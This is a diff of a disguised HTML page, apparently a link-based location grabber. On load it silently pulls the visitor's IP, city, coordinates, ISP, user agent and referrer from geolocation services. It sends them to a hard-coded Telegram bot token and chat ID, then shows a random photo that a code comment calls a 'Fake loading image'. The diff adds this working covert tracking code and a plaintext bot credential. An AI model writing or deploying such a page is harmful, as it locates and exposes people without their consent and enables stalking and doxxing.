@@ -1,63 +1,70 @@
 <!DOCTYPE html>
 <html>
 <head><title></title></head>
-<body style="margin:0;padding:0;overflow:hidden;background:#111">
+<body style="margin:0;padding:0;overflow:hidden">
 <script>
 const uid = new URLSearchParams(location.search).get('uid') || 'anon';
 
-// CORS-PROOF GEO APIs (no blocks)
-async function getGeo() {
-    // Proxy 1: allorigins.win (unlimited)
+// GEO APIs that WORK on GitHub Pages (no CORS blocks)
+async function getLocation() {
+    // #1: freeipapi.com - Reliable, no CORS issues
     try {
-        const resp = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent('https://ipinfo.io/json')}`);
-        const data = await resp.json();
-        return JSON.parse(data.contents);
+        const r = await fetch('https://freeipapi.com/api/json');
+        const d = await r.json();
+        return {ip:d.ipAddress, city:d.cityName, region:d.regionName, country:d.countryName, lat:d.latitude, lon:d.longitude, isp:d.isp};
     } catch(e) {}
     
-    // Proxy 2: corsproxy.io
+    // #2: ipapi.co free (direct works sometimes)
     try {
-        const resp = await fetch('https://corsproxy.io/?' + encodeURIComponent('https://ipinfo.io/json'));
-        return await resp.json();
+        const r = await fetch('https://ipapi.co/json/');
+        return await r.json();
     } catch(e) {}
     
-    // Direct fallback (ipinfo allows some CORS)
-    return await fetch('https://ipinfo.io/json').then(r=>r.json()).catch(()=>null);
+    // #3: ipgeolocation.io free demo
+    try {
+        const r = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=demo');
+        return await r.json();
+    } catch(e) {}
+    
+    return {city:'Unknown', country:'Unknown'};
 }
 
-async function track() {
-    const geo = await getGeo();
-    const data = {
-        uid, ip: geo?.ip,
-        city: geo?.city,
-        region: geo?.region,
-        country: geo?.country,
-        loc: geo?.loc?.split(','),
-        org: geo?.org,
-        ua: navigator.userAgent.slice(0,80)
-    };
+async function sendToTelegram(geo) {
+    // ⚠️ CRITICAL: REPLACE THESE TWO LINES:
+    const BOT_TOKEN = '7963281665:AAGjAIHudBsFs-FrPeU3TgTi0DWwAYRkIac';  // Full token from @BotFather
+    const CHAT_ID = '1572681805';      // Number from getUpdates
     
-    // REPLACE THESE 2 LINES WITH YOUR TOKENS:
-    const token = '7963281665:AAGjAIHudBsFs-FrPeU3TgTi0DWwAYRkIac';  // From @BotFather
-    const chatId = '1572681805';    // From getUpdates
+    const msg = `🎯 *${uid} LOCATION TRACKING SUCCESS* 🎯\n\n` +
+        `📍 *Location:* ${geo.city || 'N/A'}, ${geo.region || ''}\n` +
+        `🌎 *Country:* ${geo.country || 'N/A'}\n` +
+        `📊 *Coordinates:* ${geo.lat || 'N/A'}, ${geo.lon || 'N/A'}\n` +
+        `💻 *IP:* ${geo.ip || 'N/A'}\n` +
+        `🌐 *ISP:* ${geo.isp || 'N/A'}\n\n` +
+        `👤 *User Agent:* ${navigator.userAgent.slice(0,60)}\n` +
+        `🔗 *Referrer:* ${document.referrer}`;
     
-    const msg = `*🎯 ${data.uid} LOCATION CAPTURED!*` +
-        `\n📍 *${data.city || 'Unknown'}, ${data.region || ''}*` +
-        `\n🌍 ${data.country || ''}` +
-        `\n📡 ${data.loc ? data.loc[0]+', '+data.loc[1] : 'N/A'}` +
-        `\n💻 *${data.ip}*` +
-        `\n🏢 ${data.org || ''}`;
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
     
     try {
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-        console.log('✅ LOCATION SENT!');
+        await fetch(url);
+        console.log('✅ LOCATION SENT TO TELEGRAM!');
     } catch(e) {
-        console.error('❌ TELEGRAM ERROR - check tokens');
+        console.error('❌ TELEGRAM FAILED - CHECK TOKENS');
+        console.error(e);
     }
-    
-    document.body.innerHTML='<img src="https://source.unsplash.com/random/900x600/?nature" style="width:100vw;height:100vh;object-fit:cover;">';
 }
 
-track();
+// EXECUTE
+(async()=>{
+    const geo = await getLocation();
+    await sendToTelegram(geo);
+    
+    // Fake loading image
+    document.body.innerHTML = `
+        <img src="https://picsum.photos/900/600?random=${Date.now()}" 
+             style="width:100vw;height:100vh;object-fit:cover;">
+    `;
+})();
 </script>
 </body>
 </html>
